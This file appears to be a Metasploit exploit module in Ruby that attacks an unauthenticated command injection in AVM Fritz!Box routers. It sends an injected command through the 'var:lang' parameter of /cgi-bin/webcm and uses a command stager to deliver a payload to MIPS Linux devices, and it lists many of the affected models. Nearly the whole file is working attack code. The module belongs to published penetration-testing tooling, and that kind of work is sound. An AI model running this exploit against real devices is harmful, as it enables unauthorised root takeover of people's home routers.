##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Fritz!Box Webcm Unauthenticated Command Injection',
      'Description' => %q{
          Different Fritz!Box devices are vulnerable to an unauthenticated OS command injection.
        This module was tested on a Fritz!Box 7270 from the LAN side. The vendor reported the
        following devices vulnerable: 7570, 7490, 7390, 7360, 7340, 7330, 7272, 7270,
        7170 Annex A A/CH, 7170 Annex B English, 7170 Annex A English, 7140, 7113, 6840 LTE,
        6810 LTE, 6360 Cable, 6320 Cable, 5124, 5113, 3390, 3370, 3272, 3270
      },
      'Author'      =>
        [
          'unknown', # Vulnerability discovery
          'Fabian Braeunlein <fabian@breaking.systems>', #Metasploit PoC with wget method
          'Michael Messner <devnull@s3cur1ty.de>' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'OSVDB', '103289' ],
          [ 'BID', '65520' ],
          [ 'URL', 'http://www.kapple.de/?p=75' ],                       #vulnerability details with PoC
          [ 'URL', 'https://www.speckmarschall.de/hoere.htm' ],          #probably the first published details (now censored)
          [ 'URL', 'http://pastebin.com/GnMKGmZ2' ],                     #published details uncensored from speckmarschall
          [ 'URL', 'http://www.avm.de/en/Sicherheit/update_list.html' ], #vendor site with a list of vulnerable devices
          [ 'URL', 'http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii' ] #wirteup with PoC
        ],
      'DisclosureDate' => 'Feb 11 2014',
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'           => ARCH_MIPSLE,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets' =>
        [
          [ 'Automatic Targeting', { } ],
        ],
      'DefaultTarget'  => 0
      ))
  end

  def check
    begin
      res = send_request_cgi({
        'uri'    => '/cgi-bin/webcm',
        'method'  => 'GET'
      })

      if res && [200, 301, 302].include?(res.code)
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def execute_command(cmd, opts)
    begin
      res = send_request_cgi({
        'uri'    => '/cgi-bin/webcm',
        'method' => 'GET',
        'vars_get' => {
          "var:lang" => "&#{cmd}",
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def exploit
    print_status("#{peer} - Trying to access the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end

    print_status("#{peer} - Exploiting...")

    execute_cmdstager(
      :linemax => 90
    )
  end
end
